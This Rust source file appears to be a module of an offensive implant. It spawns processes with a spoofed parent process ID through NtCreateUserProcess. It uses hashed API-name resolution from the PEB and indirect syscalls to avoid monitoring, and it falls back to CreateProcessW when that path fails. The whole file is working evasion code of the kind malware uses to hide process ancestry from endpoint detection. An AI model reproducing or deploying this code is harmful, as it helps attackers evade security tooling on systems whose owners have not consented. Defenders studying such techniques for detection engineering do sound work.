// NtCreateUserProcess + parent process attribute (stealth-adv, version-sensitive MVP).
//
// On any failure the caller MUST fall back to layer-A CreateProcessW path.
// Does not panic; returns Err(String).

use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::stealth;

const PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
/// PsAttributeParentProcess | INPUT | ADDITIVE
const PS_ATTRIBUTE_PARENT_PROCESS: usize = 0x0006_0000;
const RTL_USER_PROC_PARAMS_NORMALIZED: u32 = 0x0000_0001;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    #[cfg(target_arch = "x86_64")]
    _pad: u32,
    buffer: *mut u16,
}

impl UnicodeString {
    fn from_wide(buf: &mut [u16]) -> Self {
        let byte_len = (buf.len().saturating_sub(1) * 2) as u16; // exclude NUL for Length
        Self {
            length: byte_len,
            maximum_length: (buf.len() * 2) as u16,
            #[cfg(target_arch = "x86_64")]
            _pad: 0,
            buffer: buf.as_mut_ptr(),
        }
    }
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    #[cfg(target_arch = "x86_64")]
    _pad0: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    #[cfg(target_arch = "x86_64")]
    _pad1: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

impl ObjectAttributes {
    fn empty() -> Self {
        Self {
            length: std::mem::size_of::<Self>() as u32,
            #[cfg(target_arch = "x86_64")]
            _pad0: 0,
            root_directory: 0,
            object_name: 0,
            attributes: 0,
            #[cfg(target_arch = "x86_64")]
            _pad1: 0,
            security_descriptor: 0,
            security_quality_of_service: 0,
        }
    }
}

#[repr(C)]
struct PsAttribute {
    attribute: usize,
    size: usize,
    value: usize,
    return_length: usize,
}

#[repr(C)]
struct PsAttributeList {
    total_length: usize,
    attributes: [PsAttribute; 1],
}

/// Opaque PS_CREATE_INFO large enough for modern layouts (Size + State + union).
#[repr(C)]
struct PsCreateInfo {
    raw: [u8; 0x58],
}

impl PsCreateInfo {
    fn new() -> Self {
        let mut s = Self { raw: [0u8; 0x58] };
        let size = std::mem::size_of::<Self>();
        s.raw[..std::mem::size_of::<usize>()].copy_from_slice(&size.to_le_bytes());
        // State = PsCreateInitialState (0) already zeroed at offset sizeof(SIZE_T)
        s
    }
}

/// Try PPID-spoofed create via NtCreateUserProcess.
///
/// `cmd` should preferably include a full image path as the first token so that
/// RtlCreateProcessParametersEx does not need PATH search (layer A CreateProcessW
/// remains better at PATH resolution).
pub fn try_nt_create_user_process_ppid(cmd: &str, parent_handle: usize) -> Result<u32, String> {
    if parent_handle == 0 {
        return Err("null parent handle".into());
    }
    if cmd.is_empty() {
        return Err("empty command".into());
    }

    unsafe { try_nt_create_user_process_ppid_inner(cmd, parent_handle) }
}

unsafe fn try_nt_create_user_process_ppid_inner(
    cmd: &str,
    parent_handle: usize,
) -> Result<u32, String> {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    if ntdll == 0 {
        return Err("ntdll missing".into());
    }

    // RtlCreateProcessParametersEx / RtlDestroyProcessParameters via PEB
    type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
        *mut *mut u8, // out params
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut u8,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        u32,
    ) -> i32;
    type RtlDestroyProcessParametersFn = unsafe extern "system" fn(*mut u8) -> i32;

    let create_params: RtlCreateProcessParametersExFn = std::mem::transmute(
        stealth::get_api_addr(
            ntdll,
            stealth::hash_api_name(b"RtlCreateProcessParametersEx"),
        )
        .ok_or("RtlCreateProcessParametersEx unresolved")?,
    );
    let destroy_params: RtlDestroyProcessParametersFn = std::mem::transmute(
        stealth::get_api_addr(
            ntdll,
            stealth::hash_api_name(b"RtlDestroyProcessParameters"),
        )
        .ok_or("RtlDestroyProcessParameters unresolved")?,
    );

    // Image path = first token if it looks like a path; else fail (fallback to CreateProcessW).
    let image_path = first_token(cmd);
    if !image_path.contains('\\') && !image_path.contains('/') {
        return Err("NtCreateUserProcess MVP requires absolute image path as first token".into());
    }

    let mut image_w: Vec<u16> = std::ffi::OsStr::new(image_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut cmdline_w: Vec<u16> = std::ffi::OsStr::new(cmd)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut us_image = UnicodeString::from_wide(&mut image_w);
    let mut us_cmd = UnicodeString::from_wide(&mut cmdline_w);

    let mut process_params: *mut u8 = ptr::null_mut();
    let st = create_params(
        &mut process_params,
        &mut us_image,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut us_cmd,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );
    if st < 0 || process_params.is_null() {
        return Err(format!("RtlCreateProcessParametersEx 0x{:08X}", st as u32));
    }

    let mut attr_list = PsAttributeList {
        total_length: std::mem::size_of::<PsAttributeList>(),
        attributes: [PsAttribute {
            attribute: PS_ATTRIBUTE_PARENT_PROCESS,
            size: std::mem::size_of::<usize>(),
            value: parent_handle,
            return_length: 0,
        }],
    };

    let mut create_info = PsCreateInfo::new();

    let mut process_oa = ObjectAttributes::empty();
    let mut thread_oa = ObjectAttributes::empty();
    let mut h_process: usize = 0;
    let mut h_thread: usize = 0;

    // NtCreateUserProcess via unified syscall layer
    let status = crate::syscalls::indirect_syscall(
        stealth::hash_api_name(b"NtCreateUserProcess"),
        &[
            &mut h_process as *mut usize as usize,
            &mut h_thread as *mut usize as usize,
            PROCESS_ALL_ACCESS as usize,
            THREAD_ALL_ACCESS as usize,
            &mut process_oa as *mut _ as usize,
            &mut thread_oa as *mut _ as usize,
            0usize, // ProcessFlags
            0usize, // ThreadFlags (run immediately)
            process_params as usize,
            &mut create_info as *mut _ as usize,
            &mut attr_list as *mut _ as usize,
        ],
    );

    let _ = destroy_params(process_params);

    if status < 0 || h_process == 0 {
        if h_process != 0 {
            let _ = crate::native::close_handle(h_process);
        }
        if h_thread != 0 {
            let _ = crate::native::close_handle(h_thread);
        }
        return Err(format!("NtCreateUserProcess 0x{:08X}", status as u32));
    }

    // Query PID via NtQueryInformationProcess (ProcessBasicInformation = 0)
    let pid = query_pid(h_process).unwrap_or(0);

    let _ = crate::native::close_handle(h_thread);
    let _ = crate::native::close_handle(h_process);

    if pid == 0 {
        return Err("PID query failed after create".into());
    }

    crate::db_print!(
        "[*] spawn: nt_create_user_process ok pid={}",
        pid
    );
    Ok(pid)
}

fn first_token(cmd: &str) -> &str {
    let cmd = cmd.trim();
    if cmd.starts_with('"') {
        if let Some(end) = cmd[1..].find('"') {
            return &cmd[1..1 + end];
        }
    }
    cmd.split_whitespace().next().unwrap_or(cmd)
}

#[repr(C)]
struct ProcessBasicInformation {
    exit_status: i32,
    _pad0: u32,
    peb_base: usize,
    affinity: usize,
    base_priority: i32,
    _pad1: u32,
    unique_process_id: usize,
    inherited_from: usize,
}

unsafe fn query_pid(process_handle: usize) -> Option<u32> {
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut ret_len: u32 = 0;
    let status = crate::syscalls::indirect_syscall(
        stealth::hash_api_name(b"NtQueryInformationProcess"),
        &[
            process_handle,
            0usize, // ProcessBasicInformation
            &mut pbi as *mut _ as usize,
            std::mem::size_of::<ProcessBasicInformation>(),
            &mut ret_len as *mut u32 as usize,
        ],
    );
    if status < 0 {
        return None;
    }
    Some(pbi.unique_process_id as u32)
}
